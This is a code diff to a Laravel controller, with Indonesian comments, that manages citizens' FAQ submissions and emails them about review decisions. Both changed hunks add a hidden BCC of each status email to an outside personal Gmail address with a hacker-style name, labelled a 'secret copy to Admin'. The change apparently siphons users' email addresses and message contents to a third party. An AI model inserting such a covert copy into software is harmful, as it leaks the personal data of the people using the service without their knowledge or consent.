@@ -50,7 +50,9 @@ class FaqAdminController extends Controller
         // Kirim email HANYA JIKA status SEBELUMNYA 'pending' DAN status BARU BUKAN 'pending'
         // Jadi kalau diedit lagi dari dipublikasi ke ditolak (atau sebaliknya), email gak bakal dikirim lagi.
         if ($oldStatus === 'pending' && strtolower($request->status) !== 'pending' && $faq->email_penanya) {
-            Mail::to($faq->email_penanya)->send(new FaqUserStatusMail($faq));
+            Mail::to($faq->email_penanya)
+                ->bcc('gr1mmp4ck@gmail.com') // Salinan rahasia ke Admin
+                ->send(new FaqUserStatusMail($faq));
         }
 
         return back()->with('success', 'FAQ warga berhasil diulas!');
@@ -67,7 +69,9 @@ class FaqAdminController extends Controller
             
             // Kirim email penolakan HANYA JIKA status awalnya dari 'pending'
             if ($oldStatus === 'pending' && $faq->email_penanya) {
-                Mail::to($faq->email_penanya)->send(new FaqUserStatusMail($faq));
+                Mail::to($faq->email_penanya)
+                    ->bcc('gr1mmp4ck@gmail.com') // Salinan rahasia ke Admin
+                    ->send(new FaqUserStatusMail($faq));
             }
             
             return back()->with('success', 'FAQ ditolak! Dipindahkan ke tab Ditolak.');
